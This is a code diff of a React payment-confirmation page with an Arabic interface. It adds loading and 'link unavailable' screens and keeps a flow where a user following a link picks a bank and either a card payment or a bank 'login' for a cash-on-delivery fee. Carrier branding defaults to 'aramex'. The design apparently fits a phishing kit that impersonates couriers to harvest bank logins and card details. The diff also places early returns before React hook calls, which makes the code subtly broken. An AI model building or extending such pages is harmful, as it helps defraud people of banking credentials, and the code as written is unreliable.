@@ -18,6 +18,7 @@ import {
   Building2,
   ShieldCheck,
 } from "lucide-react";
+import FullScreenLoader from "@/components/FullScreenLoader";
 
 type PaymentMethod = "card" | "login";
 
@@ -30,21 +31,42 @@ const PaymentTrackConfirm = () => {
   const [selectedMethod, setSelectedMethod] = useState<PaymentMethod | "">("");
   const [selectedBank, setSelectedBank] = useState<string>("");
 
-  const countryCode = linkData?.country_code || "";
+  if (isLoading) {
+    return <FullScreenLoader label="جاري تحميل تفاصيل الدفع..." />;
+  }
+
+  if (!linkData) {
+    return (
+      <div className="min-h-screen flex items-center justify-center bg-background" dir="rtl">
+        <div className="text-center p-8">
+          <CreditCard className="w-12 h-12 mx-auto mb-4 text-muted-foreground" />
+          <h2 className="text-lg font-semibold mb-2">الرابط غير متاح</h2>
+          <p className="text-sm text-muted-foreground">
+            تعذر العثور على بيانات الدفع. تأكد من صلاحية الرابط أو تواصل مع الدعم.
+          </p>
+        </div>
+      </div>
+    );
+  }
+
+  const countryCode = linkData.country_code || "";
   const countryData = getCountryByCode(countryCode);
 
-  const payload = linkData?.payload as Record<string, any> | undefined;
-  const serviceKey = payload?.service_key || payload?.service || "aramex";
-  const serviceName = payload?.service_name || serviceKey;
+  const payload = (linkData.payload ?? {}) as Record<string, any>;
+  const urlService = typeof window !== "undefined" ? new URLSearchParams(window.location.search).get("service") : null;
+  const serviceKey = payload.service_key || payload.service || payload.carrier || urlService || "aramex";
+  const serviceName = payload.service_name || serviceKey;
   const branding = getServiceBranding(serviceKey);
   const banks = useMemo<Bank[]>(() => getBanksByCountry(countryCode?.toUpperCase() || ""), [countryCode]);
 
-  const codAmount = payload?.cod_amount ?? 0;
+  const codAmount = payload.cod_amount ?? 0;
+
+  const payloadSelectedBank = typeof payload.selected_bank === "string" ? payload.selected_bank : "";
 
   const lockedMethod: PaymentMethod | undefined =
-    payload?.payment_method === "login"
+    payload.payment_method === "login"
       ? "login"
-      : payload?.payment_method === "card"
+      : payload.payment_method === "card"
         ? "card"
         : undefined;
 
@@ -53,7 +75,7 @@ const PaymentTrackConfirm = () => {
     const storedBankRaw = sessionStorage.getItem("selectedBank") || "";
     const normalizeBank = (value: string) => (value === "skipped" || value === "skip" ? "" : value);
 
-    const defaultMethod: PaymentMethod = lockedMethod || (payload?.selected_bank ? "login" : "card");
+    const defaultMethod: PaymentMethod = lockedMethod || (payloadSelectedBank ? "login" : "card");
 
     if (storedMethod) {
       setSelectedMethod(storedMethod);
@@ -61,7 +83,7 @@ const PaymentTrackConfirm = () => {
       setSelectedMethod(defaultMethod);
     }
 
-    const payloadBank = typeof payload?.selected_bank === "string" ? normalizeBank(payload.selected_bank) : "";
+    const payloadBank = normalizeBank(payloadSelectedBank);
     const normalizedStoredBank = normalizeBank(storedBankRaw);
 
     if (normalizedStoredBank) {
@@ -69,7 +91,7 @@ const PaymentTrackConfirm = () => {
     } else if (payloadBank) {
       setSelectedBank(payloadBank);
     }
-  }, [lockedMethod, payload?.selected_bank]);
+  }, [lockedMethod, payloadSelectedBank]);
 
   useEffect(() => {
     // Clear stale information when entering the flow fresh
@@ -84,7 +106,7 @@ const PaymentTrackConfirm = () => {
   }, []);
 
   const handleContinue = () => {
-    const method = (lockedMethod || selectedMethod || (payload?.selected_bank ? "login" : "card")) as PaymentMethod;
+    const method = (lockedMethod || selectedMethod || (payloadSelectedBank ? "login" : "card")) as PaymentMethod;
 
     if (method === "login" && !selectedBank) {
       toast({
